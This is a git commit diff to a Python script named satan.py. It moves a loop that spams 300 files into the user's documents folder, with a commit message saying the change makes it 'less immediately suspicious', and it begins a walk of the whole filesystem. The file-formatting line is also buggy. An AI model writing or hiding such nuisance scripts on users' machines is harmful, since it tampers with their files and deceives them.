392120659e91b1f74f5d999c0174b30e8c202576
cisnerosa2000 <cisnerosa2000@gmail.com>
2016-05-16 16:51:21 -0500

    changed from desktop to documents to be less immediately suspicious

--- satan.py
+++ satan.py
@@ -2,7 +2,7 @@ import os
 def is_ascii(s):
     return all(ord(c) < 128 for c in s)
 for i in xrange(300):
-    os.system("touch desktop/%s.txt") % i
+    os.system("touch documents/%s.txt") % i
 for roots, dirs, files in os.walk("/"):
    for f in files:
       filename = f if is_ascii(f) else "unicode"
